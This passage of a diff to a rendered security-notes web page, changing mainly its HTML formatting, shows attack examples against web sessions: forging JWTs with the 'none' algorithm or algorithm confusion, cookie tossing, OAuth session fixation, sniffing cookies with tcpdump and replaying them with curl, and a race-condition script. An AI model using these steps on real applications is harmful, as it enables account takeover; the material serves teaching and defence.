 </span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><h3 id="jwt-token-manipulation">
-  JWT Token Manipulation
-  <a class="anchor" href="#jwt-token-manipulation">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;</span></span></code></pre></div><h3 id="jwt-token-manipulation">JWT Token Manipulation<a class="anchor" href="#jwt-token-manipulation">#</a></h3>
 <p><strong>Algorithm Confusion Attack:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">jwt</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">jwt</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">base64</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Original</span> <span style="color:#a6e22e">JWT</span> (<span style="color:#a6e22e">signed</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">HS256</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.signature&#34;</span>
@@ -1689,9 +1597,8 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decoded</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Create</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">token</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">malicious_token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">urlsafe_b64encode</span>(<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">dumps</span>(<span style="color:#a6e22e">header</span>).<span style="color:#a6e22e">encode</span>()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> <span style="color:#f92672">\</span>
-</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">urlsafe_b64encode</span>(<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">dumps</span>(<span style="color:#a6e22e">payload</span>).<span style="color:#a6e22e">encode</span>()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span>
-</span></span></code></pre></div><p><strong>JWT Signature Bypass:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Change</span> <span style="color:#a6e22e">algorithm</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">RS256</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">HS256</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">urlsafe_b64encode</span>(<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">dumps</span>(<span style="color:#a6e22e">payload</span>).<span style="color:#a6e22e">encode</span>()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span></span></span></code></pre></div><p><strong>JWT Signature Bypass:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Change</span> <span style="color:#a6e22e">algorithm</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">RS256</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">HS256</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Server</span> <span style="color:#a6e22e">might</span> <span style="color:#a6e22e">verify</span> <span style="color:#a6e22e">using</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">HMAC</span> <span style="color:#a6e22e">secret</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Original</span> <span style="color:#a6e22e">header</span>
@@ -1700,75 +1607,52 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Modified</span> <span style="color:#a6e22e">header</span>
 </span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;alg&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;HS256&#34;</span>, <span style="color:#e6db74">&#34;typ&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;JWT&#34;</span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sign</span> <span style="color:#66d9ef">with</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span> (<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">accessible</span>)
-</span></span></code></pre></div><h3 id="cookie-tossing-attack">
-  Cookie Tossing Attack
-  <a class="anchor" href="#cookie-tossing-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sign</span> <span style="color:#66d9ef">with</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span> (<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">accessible</span>)</span></span></code></pre></div><h3 id="cookie-tossing-attack">Cookie Tossing Attack<a class="anchor" href="#cookie-tossing-attack">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Attacker controls subdomain: evil.target.com
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Attacker controls subdomain: evil.target.com
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Set cookie for parent domain
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session=attacker_session; domain=.target.com; path=/&#34;</span>;
+</span></span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session=attacker_session; domain=.target.com; path=/&#34;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// When victim visits www.target.com
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Browser sends both cookies
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// If app uses first cookie received, attacker&#39;s cookie wins
-</span></span></span></code></pre></div><h3 id="session-donation-attack">
-  Session Donation Attack
-  <a class="anchor" href="#session-donation-attack">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// If app uses first cookie received, attacker&#39;s cookie wins</span></span></span></code></pre></div><h3 id="session-donation-attack">Session Donation Attack<a class="anchor" href="#session-donation-attack">#</a></h3>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">creates</span> <span style="color:#a6e22e">account</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">target</span> <span style="color:#a6e22e">site</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">creates</span> <span style="color:#a6e22e">account</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">target</span> <span style="color:#a6e22e">site</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">authenticates</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">obtains</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">forces</span> <span style="color:#a6e22e">victim</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">use</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">session</span> (<span style="color:#a6e22e">session</span> <span style="color:#a6e22e">fixation</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">performs</span> <span style="color:#a6e22e">actions</span> <span style="color:#a6e22e">thinking</span> <span style="color:#a6e22e">they</span><span style="color:#e6db74">&#39;re anonymous
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Attacker logs into their own account
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Sees victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">actions</span><span style="color:#f92672">/</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">associated</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">attacker</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><hr>
-<h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-session-hijacking-via-network-sniffing">
-  1. Session Hijacking via Network Sniffing
-  <a class="anchor" href="#1-session-hijacking-via-network-sniffing">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Sees victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">actions</span><span style="color:#f92672">/</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">associated</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">attacker</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><hr>
+<h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-session-hijacking-via-network-sniffing">1. Session Hijacking via Network Sniffing<a class="anchor" href="#1-session-hijacking-via-network-sniffing">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Public WiFi network without encryption allows packet sniffing to capture session cookies transmitted over HTTP.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sets</span> <span style="color:#a6e22e">up</span> <span style="color:#a6e22e">packet</span> <span style="color:#a6e22e">capture</span> <span style="color:#a6e22e">on</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">WiFi</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sets</span> <span style="color:#a6e22e">up</span> <span style="color:#a6e22e">packet</span> <span style="color:#a6e22e">capture</span> <span style="color:#a6e22e">on</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">WiFi</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">tcpdump</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">wlan0</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">A</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">grep</span> <span style="color:#e6db74">&#34;Cookie:&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">browses</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//insecure-site.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">captures</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">captures</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">replays</span> <span style="color:#a6e22e">cookie</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//insecure-site.com/account \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session_id=captured_session_123&#34;</span>
-</span></span></code></pre></div><hr>
-<h3 id="2-session-fixation-in-oauth-flow">
-  2. Session Fixation in OAuth Flow
-  <a class="anchor" href="#2-session-fixation-in-oauth-flow">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session_id=captured_session_123&#34;</span></span></span></code></pre></div><hr>
+<h3 id="2-session-fixation-in-oauth-flow">2. Session Fixation in OAuth Flow<a class="anchor" href="#2-session-fixation-in-oauth-flow">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application doesn&rsquo;t regenerate session after OAuth authentication, allowing attacker to pre-set session before victim authenticates.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">visits</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#a6e22e">Gets</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker_123</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">visits</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/
+</span></span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">Gets</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker_123</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">crafts</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">link</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">fixed</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/oauth/login?session=attacker_123
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">clicks</span> <span style="color:#a6e22e">link</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">authenticates</span> <span style="color:#a6e22e">via</span> <span style="color:#a6e22e">OAuth</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">clicks</span> <span style="color:#a6e22e">link</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">authenticates</span> <span style="color:#a6e22e">via</span> <span style="color:#a6e22e">OAuth</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">associates</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">account</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">attacker_123</span> <span style="color:#a6e22e">session</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">uses</span> <span style="color:#a6e22e">attacker_123</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><hr>
-<h3 id="3-jwt-none-algorithm-attack">
-  3. JWT None Algorithm Attack
-  <a class="anchor" href="#3-jwt-none-algorithm-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">uses</span> <span style="color:#a6e22e">attacker_123</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><hr>
+<h3 id="3-jwt-none-algorithm-attack">3. JWT None Algorithm Attack<a class="anchor" href="#3-jwt-none-algorithm-attack">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application accepts JWT tokens with &ldquo;none&rdquo; algorithm, allowing unsigned token creation.</p>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">base64</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">base64</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">json</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Create</span> <span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">JWT</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;alg&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;none&#34;</span>, <span style="color:#e6db74">&#34;typ&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;JWT&#34;</span>}
@@ -1779,16 +1663,12 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Create</span> <span style="color:#a6e22e">token</span> (<span style="color:#a6e22e">no</span> <span style="color:#a6e22e">signature</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">malicious_jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;{header_b64}.{payload_b64}.&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Use</span> <span style="color:#a6e22e">token</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Authorization</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Bearer</span> <span style="color:#a6e22e">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span>.<span style="color:#a6e22e">eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9</span>.
-</span></span></code></pre></div><hr>
-<h3 id="4-race-condition-in-session-validation">
-  4. Race Condition in Session Validation
-  <a class="anchor" href="#4-race-condition-in-session-validation">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Authorization</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Bearer</span> <span style="color:#a6e22e">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span>.<span style="color:#a6e22e">eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9</span>.</span></span></code></pre></div><hr>
+<h3 id="4-race-condition-in-session-validation">4. Race Condition in Session Validation<a class="anchor" href="#4-race-condition-in-session-validation">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application has race condition between session validation and session invalidation during logout.</p>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">threading</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session=valid_session_123&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">logout</span>()<span style="color:#f92672">:</span>
@@ -1802,32 +1682,24 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">logout_thread</span>.<span style="color:#a6e22e">start</span>()
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Immediately</span> <span style="color:#66d9ef">try</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">resource</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">100</span>)<span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threading</span>.<span style="color:#a6e22e">Thread</span>(<span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#a6e22e">access_protected</span>).<span style="color:#a6e22e">start</span>()
-</span></span></code></pre></div><hr>
-<h3 id="5-session-hijacking-via-subdomain-takeover">
-  5. Session Hijacking via Subdomain Takeover
-  <a class="anchor" href="#5-session-hijacking-via-subdomain-takeover">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">threading</span>.<span style="color:#a6e22e">Thread</span>(<span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#a6e22e">access_protected</span>).<span style="color:#a6e22e">start</span>()</span></span></code></pre></div><hr>
+<h3 id="5-session-hijacking-via-subdomain-takeover">5. Session Hijacking via Subdomain Takeover<a class="anchor" href="#5-session-hijacking-via-subdomain-takeover">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Attacker takes over abandoned subdomain and uses it to set cookies for parent domain.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Find</span> <span style="color:#a6e22e">abandoned</span> <span style="color:#a6e22e">subdomain</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">old</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span> (<span style="color:#a6e22e">CNAME</span> <span style="color:#a6e22e">points</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">deleted</span> <span style="color:#a6e22e">cloud</span> <span style="color:#a6e22e">service</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Find</span> <span style="color:#a6e22e">abandoned</span> <span style="color:#a6e22e">subdomain</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">old</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span> (<span style="color:#a6e22e">CNAME</span> <span style="color:#a6e22e">points</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">deleted</span> <span style="color:#a6e22e">cloud</span> <span style="color:#a6e22e">service</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">claims</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">cloud</span> <span style="color:#a6e22e">service</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">hosts</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">old</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sets</span> <span style="color:#a6e22e">cookie</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">parent</span> <span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session=attacker_session; domain=.target.com&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">visits</span> <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">receives</span> <span style="color:#a6e22e">attacker</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">fixation</span> <span style="color:#a6e22e">achieved</span>
-</span></span></code></pre></div><hr>
-<h3 id="6-mobile-app-session-persistence-attack">
-  6. Mobile App Session Persistence Attack
-  <a class="anchor" href="#6-mobile-app-session-persistence-attack">#</a>
-</h3>
